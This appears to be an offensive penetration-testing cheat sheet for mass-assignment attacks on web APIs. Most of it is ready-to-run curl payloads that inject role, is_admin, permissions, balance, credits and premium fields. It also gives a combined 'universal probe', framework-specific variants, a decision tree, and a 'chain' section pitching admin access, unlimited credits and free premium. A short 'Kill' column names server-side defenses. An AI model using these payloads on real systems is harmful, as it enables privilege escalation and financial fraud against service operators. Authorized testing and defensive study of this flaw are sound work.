# MASS ASSIGNMENT — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Role Escalation** | role field in API | `curl -X PATCH /api/users/me -d '{"role":"admin"}'` | Profile returns role=admin | 400 "unknown field" |
| **Balance Manipulation** | balance/credits field | `curl -X PATCH /api/profile -d '{"balance":99999,"credits":9999}'` | Balance shows 99999 | balance read-only |
| **Is Admin** | is_admin boolean | `curl -X POST /api/users -d '{"name":"x","is_admin":true}'` | Can access admin features | is_admin ignored |
| **Permissions** | permissions array | `curl -X PUT /api/user/perms -d '{"permissions":["*","admin:*"]}'` | User can do anything | Whitelist validation |
| **Premium Bypass** | premium/trial fields | `curl -X PATCH /api/account -d '{"is_premium":true,"trial_used":false}'` | Premium features active | Fields computed server-side |
| **Hidden Fields** | Response has extra fields | `curl -X POST /api/signup -d '{"email":"x@x.com","referral_code":"REF1","bonus":500}'` | Bonus of 500 credited | Server ignores bonus field |

## CURL COMMANDS
```bash
# Universal mass assignment probe
# Try every field you see in responses
curl -X PATCH /api/user/update -H "Cookie: A" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"test",
    "email":"test@test.com",
    "role":"admin",
    "is_admin":true,
    "is_active":true,
    "is_verified":true,
    "balance":999999,
    "credits":999999,
    "permissions":["*","admin:*"],
    "is_premium":true,
    "trial_end":null,
    "referral_code":"SELF",
    "api_key":"custom_key"
  }'

# Check if any field took effect
curl -s -X GET /api/user/profile -H "Cookie: A" | jq '{role, is_admin, balance, credits, is_premium}'

# Framework-specific probes
# Rails: curl -X PATCH /api/users -d 'user[role]=admin'
# Laravel: curl -X PUT /api/profile -d '{"role":"admin"}'  
# Spring: curl -X PATCH /api/user -d '{"role":"admin"}'
# JSON: try nested: curl -X POST /api/users -d '{"user":{"role":"admin"}}'
```

## DECISION TREE
```
Found API endpoint that creates/updates?
├─ Can add extra fields to request?
│  ├─ Some fields take effect → MASS ASSIGNMENT (check which)
│  └─ All extra fields ignored → DTO/whitelist
├─ Role/permission fields accepted?
│  ├─ Yes → PRIVILEGE ESCALATION via mass assignment
│  └─ No → authorization computed server-side
├─ Balance/credits accepted?
│  ├─ Yes → FINANCIAL MANIPULATION
│  └─ No → read-only
└─ Fields from response match request?
   ├─ Exact match → direct model binding (vulnerable)
   └─ Different → DTO pattern (safer)
```

## CHAIN
Mass Assignment + Role Escalation = Admin access
Mass Assignment + Balance Manipulation = Unlimited credits
Mass Assignment + Premium Bypass = Free premium
